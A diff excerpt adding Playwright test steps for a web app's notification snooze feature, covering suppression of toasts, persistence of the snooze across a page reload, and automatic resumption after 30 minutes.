+    await page.evaluate(() => { window.notifyToast('done', 'x', 'Done', 'a finished'); window.notifyToast('approval', 'x', 'Needs approval', 'a blocked', 0); });
+    expect((await toasts()).join()).not.toContain('Needs approval');
+    await expect(page.locator('#snooze-btn')).toBeVisible();
+    await expect(page.locator('#snooze-btn .sn-left')).toHaveText('30m');
+    await page.reload(); await boot(page, '/?demo');                      // a reload keeps it
+    await expect(page.locator('#snooze-btn')).toBeVisible();
+    await page.evaluate(() => window.notifyToast('done', 'x', 'Done', 'b finished'));
+    await page.clock.fastForward(31 * 60000);                             // ends on time
+    await expect(page.locator('#snooze-btn')).toBeHidden();
+    await expect(page.locator('.toast')).toContainText(['Notifications back on']);
+    await page.evaluate(() => window.notifyToast('done', 'x', 'Done', 'c finished'));
+    await expect(page.locator('.toast', { hasText: 'c finished' })).toHaveCount(1);   // notifications are back
   });
 });
